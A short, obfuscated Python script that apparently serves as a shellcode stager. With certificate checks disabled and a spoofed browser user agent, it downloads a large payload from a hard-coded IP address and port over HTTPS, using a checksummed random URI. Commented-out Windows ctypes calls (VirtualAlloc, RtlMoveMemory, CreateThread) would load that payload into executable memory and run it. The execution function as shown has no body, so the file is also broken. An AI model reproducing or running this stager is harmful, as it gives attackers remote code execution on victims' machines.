import urllib.request, string, random, struct, time, ssl, ctypes as NLiLnTr
ssl._create_default_https_context = ssl._create_unverified_context
def func1(s): return sum([ord(ch) for ch in s]) % 0x100
def func2():
    for x in range(64):
        var1 = ''.join(random.sample(string.ascii_letters + string.digits,3))
        var2 = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
        for item1 in var2:
            if func1(var1 + item1) == 92: return var1 + item1
def func3(arg1,arg2):
    var3 = urllib.request.ProxyHandler({})
    var4 = urllib.request.build_opener(var3)
    urllib.request.install_opener(var4)
    var5 = urllib.request.Request("https://" + arg1 + ":" + str(arg2) + "/" + func2(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})
    try:
        var6 = urllib.request.urlopen(var5)
        try:
            if int(var6.info()["Content-Length"]) > 100000: return var6.read()
            else: return ''
        except: return var6.read()
    except urllib.request.URLError: return ''
def func4(arg3):
    # if arg3 != "":
    #     JHOQNizxcW = bytearray(arg3)
    #     CWNEMmD = NLiLnTr.windll.kernel32.VirtualAlloc(NLiLnTr.c_int(0),NLiLnTr.c_int(len(JHOQNizxcW)), NLiLnTr.c_uint64(0x3000),NLiLnTr.c_uint64(0x40))
    #     ulLJUXVwChLHefF = (NLiLnTr.c_char * len(JHOQNizxcW)).from_buffer(JHOQNizxcW)
    #     NLiLnTr.windll.kernel32.RtlMoveMemory(NLiLnTr.c_int(CWNEMmD),ulLJUXVwChLHefF, NLiLnTr.c_int(len(JHOQNizxcW)))
    #     wmgeUydbFnjJh = NLiLnTr.windll.kernel32.CreateThread(NLiLnTr.c_int(0),NLiLnTr.c_int(0),NLiLnTr.c_int(CWNEMmD),NLiLnTr.c_int(0),NLiLnTr.c_int(0),NLiLnTr.pointer(NLiLnTr.c_int(0)))
    #     NLiLnTr.windll.kernel32.WaitForSingleObject(NLiLnTr.c_int(wmgeUydbFnjJh),NLiLnTr.c_int(-1))

shellcode = ''
shellcode = func3("47.111.239.107", 8432)
func4(shellcode)
